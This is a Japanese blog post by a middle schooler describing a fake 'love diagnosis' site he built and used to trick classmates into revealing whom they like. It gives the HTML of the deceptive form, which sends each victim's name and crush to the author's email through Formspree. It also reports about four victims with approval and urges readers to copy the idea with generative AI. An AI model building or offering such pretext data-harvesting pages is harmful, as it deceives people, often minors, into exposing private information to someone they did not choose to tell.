他人の好きな人を知るサイトについて

中2 物理工作班 K.S
Tweet

はじめに

みなさん、はじめまして.
私は、主に看板作りなどの物理工作をしている中2です.

さて、小中学生のみなさん、友達の好きな子を知りたいと思いませんか？ 他人の秘密を握ることは非常に楽しいですよね. そこで、友達の好きな子を知るためのサイトを作り、友情崩壊覚悟で使ってみました！
もしも興味があれば、是非最後まで読んでください. その他の方は、このページをのり付けしてください.

注意

この内容は、1年以上前（当時中1）に作ったサイトの説明です. また、この記事は詐欺を推奨するものではありません.

きっかけ

少し前にラブメーターという、恋愛診断に見せかけ、好きな人の名前を友だちに暴露してしまうという、凶悪なサイトが流行りました. しかし、既に知っているという人が多くなっているため、URLを送信しても、相手が騙されてくれなくなっていました. そこで、中1の私は思いつきました. 「自分専用に、新しくサイトを作れば良い」と.

サイトの仕組み

ようやく、みなさんが待ちに待っていた説明に入ります. サイトを作る手順はこちらです.

  1. サイトのURLを送られた相手が恋愛診断だと勘違いする
  2. 相手がサイトに自身の名前と好きな人の名前を入力する
  3. 診断開始ボタンを押すと、私のメールに送信される

<!DOCTYPE HTML>
<html lang="ja"> // lang="ja"はページの言語が日本語であることを示します.
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>恋愛診断</title>
  <style>
    // この中でフォントを変えたりレイアウトを整えたりできます. 中身は長すぎるので省きます.
  </style>
</head>
<body>
  <div class="form-container">
    <h2>99%当たる！恋愛診断…💌</h2>
      <form action="https://formspree.io/f/(ここでは見せられません)" method="POST">
          <input type="text" name="crush" placeholder="あなたの名前を入力（フルネーム）" required>
          <input type="text" name="crush" placeholder="気になるあの人の名前を入力（フルネーム）" required>
          <button type="submit">診断開始♡</button>
      </form>
  </div>
</body>
</html>

直接自分のメールアドレスを入力するとスパムの対象となってしまう可能性があるので、Formspreeというサイトを介してメールに送信することでいつでも接続解除できるようにしています.
そして、出来上がったサイトの見た目がこちら.

上の見た目だと少しダサいので、最近進化してきているAIにデザインを変えてもらいました. スマホでの表示の崩れも修正してくれています.

サイトの公開

GitHubというサイトを使って先程お見せしたサイトを公開します. 自分で作ったサイトの公開方法が気になる方は、ご自身でインターネットでご検索ください.

実際に使ってみる

実際に入力して送信すると、このようにメールが送られてきます.

メールの中身は、「｛送信者の名前｝,｛好きな相手の名前｝」となっています.

終わりに

このサイトでは相手の名前しか知ることができないため、実際の人物を特定するのは困難ですが、その相手が同じ学校の中に居るときはとても役に立つと思います.
今回作ったサイトによる被害者は約4名でした. 騙されずに架空の名前を送信している方はたくさんいましたが、4人もの秘密を握れたのはとても大きな功績だと思います.
「自分もこんなサイトを作ってみたい」という方は、生成AIを用いるのがおすすめです.
